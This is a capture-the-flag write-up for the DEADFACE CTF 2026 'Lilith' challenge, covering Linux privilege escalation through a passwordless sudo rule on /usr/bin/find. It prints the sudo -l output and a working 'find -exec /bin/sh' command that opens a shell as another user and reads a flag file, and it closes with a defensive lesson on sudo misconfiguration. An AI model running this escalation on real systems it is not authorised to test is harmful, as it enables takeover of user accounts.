---
title: Lilith
tags:
  - DEADFACE CTF 2026
  - Exploitation
  - Linux
  - Forensics
---

# Lilith

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Hostbusters · Forensics / Linux priv-esc |
| **Points** | 250 |
| **Author** | @syyntax |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> `sunstalker` was granted a narrow permission "to help another member run a job." Narrow permissions on the wrong binary aren't narrow at all.
>
> Become the next user and read their flag.
>
> Submit the flag as `deadface{flag-text}`.

Access: `https://hostbusters.dctf.io/` (continuing from [On Schedule](on-schedule.md))

## Solution

### 1. Checking `sunstalker`'s delegated `sudo` privileges

Once executing as `sunstalker` (via `/opt/scrape/collect.sh` in [On Schedule](on-schedule.md)), running `sudo -l` reveals a passwordless `sudo` rule allowing `sunstalker` to run `/usr/bin/find` as **`lilith`**:

```bash
sudo -l
# (lilith) NOPASSWD: /usr/bin/find
```

### 2. Escalating to `lilith` via GTFOBins (`find -exec`)

Because `/usr/bin/find` supports the `-exec` flag, granting `sudo` on `find` is equivalent to granting a full shell as the target user:

```bash
sudo -u lilith /usr/bin/find . -maxdepth 0 -exec /bin/sh -c 'id; cat /home/lilith/flag.txt' \;
```

```text
uid=1005(lilith) gid=1005(lilith) groups=1005(lilith)
deadface{sud0_f1nd_4_w4y_1n}
```

## Flag

!!! flag "Flag"
    `deadface{sud0_f1nd_4_w4y_1n}`

## Takeaways

Standard utilities like `find`, `vim`, `less`, `awk`, and `tar` allow arbitrary command execution (`-exec` or shell escapes). Granting `NOPASSWD` `sudo` access to `/usr/bin/find` without restricting arguments hands over full control of the target user account.
